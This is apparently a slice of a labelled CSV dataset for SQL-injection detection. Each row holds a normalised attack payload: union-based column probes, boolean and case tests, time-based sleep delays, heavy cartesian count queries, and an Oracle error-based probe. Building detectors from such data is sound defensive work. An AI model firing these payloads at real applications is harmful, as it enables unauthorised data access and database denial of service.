row_index,payload_norm,label,sqli_type_hint
2070,"1 ) ) as tuxy where 6855 = 6855 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
2071,"1%"" union all select null,null#",1,
2072,1'|| ( select 'vxfx' where 7038 = 7038 and 9306 = 4187 ) ||',1,
2073,-8328 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) # rlva,1,
2074,"1 ) as iupg where 2861 = 2861 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
2075,"1"" ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ""ampn"" like ""ampn",1,
2076,"1%"" ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ""%"" = """,1,
2077,"1' in boolean mode ) union all select null,null,null,null,null,null,null,null,null,null--",1,
2078,"1"" ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( ""dyoe"" = ""dyoe",1,
2079,1%' ) or sleep ( 5 ) and ( '%' = ',1,
2080,"1 ) ) ) and elt ( 4249 = 4249,7259 ) and ( ( ( 5030 = 5030",1,
2081,"1%' ) ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",1,
2082,"-8868"" ) where 5681 = 5681 union all select 5681,5681,5681,5681,5681,5681,5681,5681,5681,5681--",1,
2083,"1%"" and elt ( 3114 = 3114,sleep ( 5 ) ) #",1,
2084,"1"" ) ) ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
2085,"1' ) ) as fwhv where 3921 = 3921 union all select null,null--",1,
2086,1%' ) and 4061 = 2730#,1,
2087,"-3215"" ) union all select 4457,4457,4457,4457,4457#",1,
2088,"1' ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( 'ndhn' like 'ndhn",1,
2089,"1"" ) where 2764 = 2764 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --",1,
2090,"1, ( select ( case when ( 2106 = 2106 ) then ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) else 2106* ( select 2106 from master..sysdatabases ) end ) )",1,
2091,"1%"" ) union all select null,null,null,null#",1,
2092,1 ) ) rlike ( select ( case when ( 6113 = 1222 ) then 1 else 0x28 end ) ) and ( ( 2815 = 2815,1,
2093,-5449' or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and 'ryvy' like 'ryvy,1,
2094,"1' ) as bfgl where 8959 = 8959 union all select null,null,null,null,null,null,null,null,null,null--",1,
2095,"-7795"" ) where 1712 = 1712 union all select 1712,1712,1712,1712#",1,
2096,"iif ( 3760 = 4785,1,1/0 )",1,
2097,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( ""%"" = """,1,
2098,1'|| ( select 'etvo' from dual where 1557 = 1557,1,
2099,select ( case when ( 4061 = 1396 ) then 4061 else 1/ ( select 0 ) end ) --,1,
